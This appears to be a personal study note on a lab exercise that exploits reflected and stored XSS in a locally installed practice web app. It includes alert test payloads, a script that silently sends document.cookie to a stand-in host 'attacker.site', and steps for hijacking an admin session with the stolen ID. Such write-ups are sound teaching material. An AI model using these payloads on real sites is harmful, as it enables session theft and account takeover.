2024-12-20 19:12

Status:

Tags:

# Reflected XSS and Persistant XSS

## **Target Environment**

- **Web Application**: Mobile Tech
- **Domain**: `xssvictim.site`
- **Setup**: Installed locally, not available online.

---

## **Step-by-Step Analysis**

### **1. Finding Injection Points**

- **Search Field**: Found on the homepage; a prime candidate for testing.
- **Blog Page**: Contains a **comment field** allowing user input when logged in.

---

### **2. Testing the Search Field**

#### **Basic HTML Injection Test**

- Input: `<h1>hi</h1>`
- Result:
    - HTML tags are **not sanitized**.
    - Input is printed as an interpreted HTML tag.

#### **JavaScript Injection Test**

- Input: `<script>alert('XSS')</script>`
- Result:
    - An **alert box** pops up, indicating **Reflected XSS** vulnerability.
    - The application interprets and executes JavaScript code.

#### **Extracting Cookies**

- Input: `<script>alert(document.cookie)</script>`
- Result:
    - **Session cookies** are displayed, exposing session ID information.

---

### **3. Testing the Comment Field**

#### **HTML Injection Test**

- **Object Field**: Sanitizes input. HTML tags not interpreted.
- **Comment Field**: Allows `<h1>` tags.
- **Result**:
    - Input is displayed as interpreted HTML, confirming partial vulnerability.

#### **JavaScript Injection Test**

- Input: `<script>alert('XSS')</script>`
- Result:
    - Alert box appears, confirming **Stored XSS** vulnerability.

---

## **4. Crafting the Exploit**

### **Objective**:

Steal **session cookies** of victims stealthily without alert pop-ups.

### **Steps**:

1. **Attacker Server Setup**:
    
    - **Script**: `get.php` (hosted on `attacker.site`).
    - Purpose: Captures cookie information and stores it in `jar.txt`.
2. **JavaScript Payload**:
    
    - Code:
        
        javascript
        
        Copy code
        
        `<script>   var i = new Image();   i.src = "http://attacker.site/get.php?cookie=" + escape(document.cookie); </script>`
        
    - **How it works**:
        - Creates an **Image object** in JavaScript.
        - Sets the image source to the attacker's script with cookies appended as a query parameter.
        - No visible effect on the victim's browser.
3. **Injection in Comment Field**:
    
    - Insert the payload in the comment box.
    - When a victim loads the page, cookies are sent to the attacker server.

---

## **5. Impersonating the Victim (Admin Session Hijack)**

- **Steps**:
    1. Collect the **PHP session ID** from `jar.txt`.
    2. Use browser tools (e.g., Firebug) to **edit cookies**:
        - Replace current session cookie with the stolen one.
    3. Reload the page.
- **Result**:
    - Successfully logged in as **Admin**.
    - Access to admin functionalities and sensitive data.

---

## **Summary of Key Takeaways**

1. **Injection Points**:
    
    - **Search Field**: Vulnerable to Reflected XSS.
    - **Comment Field**: Vulnerable to Stored XSS.
2. **Reflected vs Stored XSS**:
    
    - **Reflected**: Immediate execution upon input submission.
    - **Stored**: Persistent; executed when the page containing the input is loaded.
3. **Cookie Theft**:
    
    - Exploiting `document.cookie` to extract session cookies.
    - Cookies can be sent to an attacker-controlled server.
4. **Payload Delivery**:
    
    - Use of JavaScript to send cookies silently via an `Image` object.
5. **Session Hijacking**:
    
    - Edit cookies in the browser to impersonate a victim’s session.

---

### **Why XSS Is Dangerous**:

- Allows attackers to **steal cookies**, impersonate users, and gain unauthorized access to sensitive data.




### References
